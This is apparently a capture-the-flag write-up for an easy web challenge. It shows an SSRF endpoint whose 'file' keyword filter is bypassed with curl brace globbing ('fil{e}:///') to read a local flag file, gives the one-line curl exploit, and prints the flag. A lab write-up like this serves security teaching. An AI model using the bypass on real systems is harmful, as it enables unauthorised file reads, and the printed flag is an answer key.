# OhMycURL

- **Lab / Category:** Web
- **Points:** 100
- **Difficulty:** easy
- **Status:** ✅ SOLVED

## Vulnerability — SSRF with a naive scheme filter (file:// read)
`POST /fetch` with `url=` hands the value to curl. The app blocks the literal substring `file`
to stop local reads, but the filter is a dumb string match while curl's URL parser is lenient —
`fil{e}` still resolves as the `file` scheme.

## Exploit
```bash
curl -s http://<instance>/fetch --data-raw "url=fil{e}:///app/flag.txt"
```

## Flag
`FlagY{eca5f4263a66728966a30b9f8fba8f0e}`
